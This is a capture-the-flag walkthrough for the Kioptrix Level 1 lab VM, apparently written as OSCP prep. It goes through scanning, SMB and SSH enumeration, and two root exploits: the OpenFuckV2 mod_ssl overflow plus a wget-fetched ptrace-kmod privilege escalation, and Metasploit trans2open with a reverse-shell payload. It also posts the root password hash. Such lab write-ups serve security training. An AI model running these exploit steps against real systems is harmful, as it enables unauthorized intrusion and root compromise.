---
title: "Kioptrix #1 Walkthrough"
author: alex
date: Thu  6 Jul 17:15:48 CEST 2023
categories: [OSCP Prep,Walkthroughs]
tags: [oscp, ctf, walkthroughs, vulnhub]
---

Today we are hacking into a highly recommended beginner boot-to-root vulnerable VM called **Kioptrix: Level 1.** I had some troubles installing the machine from VulnHub so, in case you face some errors, I'm providing you with the .OVA file for the vulnerable machine. You can download it **[here.](https://drive.google.com/file/d/1NaMSjcSPXcM4Df5mwddhP-VKtRdIOpUF/view?usp=share_link)**

## Methodology

1. Network Scanning
2. Enumeration
3. Exploitation
4. Gaining root access by method #1
5. Gaining root access by method #2

## Tools Used

- Netdiscover
- Nmap
- Nikto
- Enum4linux
- Searchsploit
- OpenFckV2 (method #1)
- Metasploit (method #2)

## Recon

Let's scan the network to discover our target's IP address:

```bash
sudo netdiscover
```
And here's the output:

```
Currently scanning: 192.168.18.0/16   |   Screen View: Unique Hosts                                               
                                                                                                                   
2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                   
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.1.1     08:00:27:bf:11:12      1      60  PCS Systemtechnik GmbH                                          
192.168.1.31    08:00:27:fd:e3:ab      1      60  PCS Systemtechnik GmbH 
```

After getting the IP address of the target we now need to enumerate the target for open ports and protocols. I have used **Nmap** aggressive command for that: 

```bash
sudo nmap -p- -T4 -A -O -v 192.168.1.31
```

> **IDS & FW TRIGGERING** 
> 
> In real world situations, **this scans may trigger firewalls and other network security appliances.** If you want to run a softer scan, just change `-sV` to `-sS`. Once you know the open ports, you can target them individually. Change `-T4` (speed 4) to `-T1` (slow speed, will take ages) as well. It's not undetectable but less probable. You can also use `-D` for decoy. Check the Nmap theory **[here!](/posts/oscpath-week-1/#port-scanning)**
{: .prompt-warning }

And the output...

```
Nmap scan report for 192.168.1.31
Host is up (0.00027s latency).
Not shown: 65529 closed tcp ports (reset)

PORT      STATE SERVICE     VERSION

22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1)
|   1024 8f8e5b81ed21abc180e157a33c85c471 (DSA)
|_  1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA)

80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux

111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status

139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)

443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-09-26T09:32:06
| Not valid after:  2010-09-26T09:32:06
| MD5:   78ce52934723e7fec28d74ab42d702f1
|_SHA-1: 9c4291c3bed2a95b983d10acf766ecb987661d33
|_ssl-date: 2023-04-05T18:01:52+00:00; +3h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: 400 Bad Request

32768/tcp open  status      1 (RPC #100024)

MAC Address: 08:00:27:1F:EB:7A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Uptime guess: 0.047 days (since Wed Apr  5 14:54:46 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=198 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: 3h59m58s
|_smb2-time: Protocol negotiation failed (SMB2)
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1d>          Flags: <unique><active>
|_  MYGROUP<1e>          Flags: <group><active>

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 192.168.1.31
```

WOW! That's a lot of information! Let's analyze it before we continue:

**Let's start with HTTP and HTTPS.** We have both ports open. **Port 80 is for http and port 443 for https.**  So the first thing we are going to do is open the browser and search for them. After that, we will begin HTTP and HTTPS enumeration. Interesting findings:

- **Apache/1.3.20 (Unix)**
- **mod_ssl/2.8.4**
- **OpenSSL/0.9.6b**

Another interesting port is the **Samba port: 139**. We will get to it later.

> **FYI**
> 
> SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network.
{: .prompt-tip }

And, finally, **port 22: the SSH port.** I will leave this one for the end as the enumeration can be a bit tricky. Interesting findings:

- **OpenSSH 2.9p2 (protocol 1.99)**
- **sshv1: Server supports SSHv1**

Now we know a bit more about **Kioptrix**, let start enumerating...

## Enumeration

### HTTP Enumeration

As soon as we search for `http://192.168.1.31/` we see a **Test Page** with a little bit of information about why we are seeing that page. In these cases, I don't bother too much about these pages because **they are auto generated by Apache.** I always read them and check the page source just in case but that's it. Then I tried to look for the `robots.txt` but there is no *robots.txt*. To shorten up the enumeration, let's start running a **Nikto scan.**

```bash
sudo nikto -h http://192.168.1.31:80/ -C all
```

> **IDS & FW TRIGGERING** 
> 
> In real world situations, **Nikto** scans can be detected by website's firewall. I have proved it myself. So run this scans with that in mind.
{: .prompt-warning }

Nikto is thowing up a lot of valuable information. Here is some of it:

```
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
```

Let's keep enumertaing Kioptrix. Now it's time to use **Dirbuster** -- a directory listing tool.

```bash
sudo dirbuster
```

Once the GUI opens let's fill in those fields:

- **Target URL:** `http://192.168.1.31:80/` (here it's important to add the port).
- **Threads:** Click the `Go Faster` checkbox to set it to 200.
- **File with list of dirs/files:** `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt` (let start small).
- **File extension:** The more we put, the slower it will go. Now that we know Kioptrix has PHP files, let's leave just `php`

All set? Hit start then! After a while, nothing interesting seems to appear, only a **test page file:** `test.php`. So... what about start enumerating the **SMB** protocol?

### SMB Enumeration

SMB ports are well known for being insecure. There are loads of exploits for them. **So make sure your Samba ports are closed if not used.** But now we are in the attacker's side so it's good for us that SMB ports are open.

Let's start enumerating SMB.

```bash
sudo nmblookup -A 192.168.1.31 
```

An nothing new in the output. **Nmap already showed us this:**

```
Looking up status of 192.168.1.31
        KIOPTRIX        <00> -         B <ACTIVE> 
        KIOPTRIX        <03> -         B <ACTIVE> 
        KIOPTRIX        <20> -         B <ACTIVE> 
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
        MYGROUP         <00> - <GROUP> B <ACTIVE> 
        MYGROUP         <1d> -         B <ACTIVE> 
        MYGROUP         <1e> - <GROUP> B <ACTIVE> 
    
        MAC Address = 00-00-00-00-00-00
```

But it's always better to double check! Ok, next enumeration command:

```bash
sudo smbclient -L 192.168.1.31   
```

After running it, we are prompted to enter a root password which we don't have. 

```
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Password for [WORKGROUP\root]:
```

Anyway, I always try my luck: **root** as password. I know, it's not the password but we get some info anyway: 

```
        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
        
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX
```

With this information, we can try to connect to see the files. 

```bash
sudo smbclient \\\\192.168.1.31\\ADMIN$
```

**Access denied**

```bash
sudo smbclient \\\\192.168.1.31\\IPC$
```

Now we get a **smb: \>** console... but unfortunately it's a dead end. We have to keep enumerating!

Now we are going to use Nmap again. Nmap is a really, really powerful tool. Why? Because we can use scripts to enhance its capabilities. For more info, check their website [**nmap.org**](https://nmap.org/). **So let's use a script to enumerate SMB vulnerabilities:**

```bash
sudo nmap --script smb-vuln* -p 139 192.168.1.31
```

With the parameter `--script` now we can load any of the available scripts. By default **Kali Linux** comes with the "official" ones - but there are scripts made by the community as well that work amazing. The * after the script tells **Nmap** to use ANY script that starts with `smb-vuln` so we don't need to repeat the scan for each one of the SMB vulnerability scripts. Let's check the output:

```
PORT    STATE SERVICE

139/tcp open  netbios-ssn
MAC Address: 08:00:27:1F:EB:7A (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
```

Now let's use one more tool: **enum4linux.** Enum4linux is a powerful tool that can detect and fetch data from both windows and linux and also SMB hosts on the network.

```bash
sudo enum4linux -U 192.168.1.31
```

And we get some output. Here are the interesting parts:

```
=========================================( Target Information )=========================================
                                                                                                                    
Target ........... 192.168.1.31                                                                                  
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


============================( Enumerating Workgroup/Domain on 192.168.1.31 )============================
                                                                                                                    
                                                                                                                    
[+] Got domain/workgroup name: MYGROUP                                                                           
                                                                                                                    
                                                                                                                    
===================================( Session Check on 192.168.1.31 )===================================
                                                                                                                    
                                                                                                                    
[+] Server 192.168.1.31 allows sessions using username '', password ''
```

**Now we know some of the users as well as the possibility of sessions without username nor password.**

And, finally, to help us later in our search for an exploit, let's see what is the Samba version with Metasploit:

```bash
sudo msfconsole
```

Once inside Metasploit, we can search for SMB stuff:

```bash
search smb
```

And here is the command to use the script we need in order to know the Samba version:

```bash
use scanner/smb/smb_version
```

Let's set the **RHOSTS** (Kioptrix):

```bash
set RHOSTS 192.168.1.31
```

And run it:

```bash
run
```

Now we know the Samba version:

```
Unix (Samba 2.2.1a)
```

Now we can research about this version and possible exploits for it.

### SSH Enumeration

OK, enough enumeration for Samba. Now let's begin with SSH enumeration. The first thing I always try is to connect to the SSH. But this time, something funky happens:

```bash
sudo ssh 192.168.1.31 
```

And we cannot connect due to...

```
Unable to negotiate with 192.168.1.31 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

Ok. When this things happen (not usually but sometimes they do appear) try to add `-v` to the command. `-v` stands for *verbose* which means the terminal will print all the processes happening behind so we can see where the error is.

```
debug1: kex: algorithm: (no match)
```

Ok, here's the solution: 

```bash
sudo ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oPubkeyAcceptedAlgorithms=+ssh-rsa -c aes128-cbc 192.168.1.31
```

And with that command we can connect via SSH! But we don't have the password so, what's the point? Well, sometimes when you try to connect via SSH a banner is exposed. This banner may contain valuable information. Not this time but keep it in mind for future SSH adventures.

Let's recap what we have so far:

- **mod_ssl/2.8.4:** Remote buffer overflow which may allow a remote shell.
- And **trans2open:** Buffer overflow found in Samba versions 2.2.0 to 2.2.8.

**Now we should research those exploitable points and see what we find out!** 

We can search for exploits in two places: **Google Almighty** and **Searchsploit.** I always go first to Searchsploit and, once I know a specific exploit, I search that exploit on Google. 

```bash
searchsploit mod_ssl 2.8.4
```

And here's the output:

```
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow             | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)       | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)       | unix/remote/47080.c
--------------------------------------------------------------------------------- ---------------------------------
```

Still a bit of research to do but now we know what we are looking for. And same process for the **trans2open** exploit.

## Exploitation

#### Method #1

I found quite interesting the **mod_ssl/2.8.4** vulnerability and we will be using the *OpenFckV2* exploit to abuse it. You can check the source code [**here**](https://www.exploit-db.com/exploits/47080) and read a bit more about how to use it [**here.**](https://github.com/heltonWernik/OpenLuck)

Just download the **OpenFckV2.c** and compile it:

```bash
sudo gcc OpenFckV2.c -o OpenFckV2
```

Now run it with `./OpenFckV2` And you'll see the command for the different versions. Our command would be:

```bash
sudo ./OpenFckV2 0x6b 192.168.1.31 443 -c 100
```

And there we are! We have a shell! Let's see who are we:

```bash
whoami
```

*apache*

Not bad... But we were supposed to get root access straight away. If the same happened to you, here's how to fix it. We should always read all the info the terminal prints for us:

```
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--07:43:17--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
            => ptrace-kmod.c
Connecting to dl.packetstormsecurity.net:443... 
dl.packetstormsecurity.net: Host not found.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove ptrace-kmod.c: No such file or directory 
```

Ok, we are missing some **ptrace-kmod.c**. You can download the file in the same repo. Now we only need to upload it to our victim machine. Copy the file to `/var/www/html/` and start Apache:

```bash
sudo service apache2 start
```

In Kioptrix, download the file with wget:

```bash
wget YOUR-IP/ptrace-kmod.c
```

Now we just need to compile, give permissions and exploit!

```bash
gcc -o exploit ptrace-kmod.c
chmod 777 exploit
./exploit
```

And there we go! We have root acces FTW! We can check it with the command `id`:

```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

#### Method #2

With a quick search on the Internet, we already find some interesting stuff about the Samba exploitation: [**Samba trans2open Overflow (Linux x86).**](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/) And it's on **Rapid7 Exploit Database** what means... Open **Metasploit!**

```bash
sudo msfconsole
use exploit/linux/samba/trans2open
```

Ok, now we set our **RHOST** (Kioptrix) and **LHOST** (our Kali machine) and try to exploit:

```bash
set RHOSTS 192.168.1.31
set LHOST 192.168.1.23
exploit
```

But something fails... 

```
[*] 192.168.1.31:139 - Trying return address 0xbffffafc...
[*] Sending stage (1017704 bytes) to 192.168.1.31
[*] 192.168.1.31 - Meterpreter session 1 closed.  Reason: Died
[-] Meterpreter session 1 is not valid and will be closed
```

Why? Because of the payload itself. Long story short: The default payload **(linux/x86/meterpreter/reverse_tcp) is a Staged payload.** These payloads are less stable and send the payload in stages. So we have to change the payload option to a **Non-Staged payload.**

```bash
set payload linux/x86/shell_reverse_tcp
```

As you can see, the path is different:

**Staged:** set payload linux/x86/**shell/reverse_tcp**

**Non-Staged:** set payload linux/x86/**shell_reverse_tcp**

Now yes, we can `exploit` and... root access! Yay!

## Final Thoughts and Reports

Despite being an easy and beginner vulnerable machine I would always recommend this VM. And as there is no flag, I decided to post the hashed password for the root user as the flag: **$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0**

This machine helps understand and build a methodology for pentesting. As you can see, exploitation is the easiest and shortest part of the process. And it's almost always like so in pentesting. Recon, recon, recon, recon, recon. Enumeration, enumeration, enumeration, enumeration, enumeration... enumeration. And exploitation. 

Thank you for reading and happy hacking!
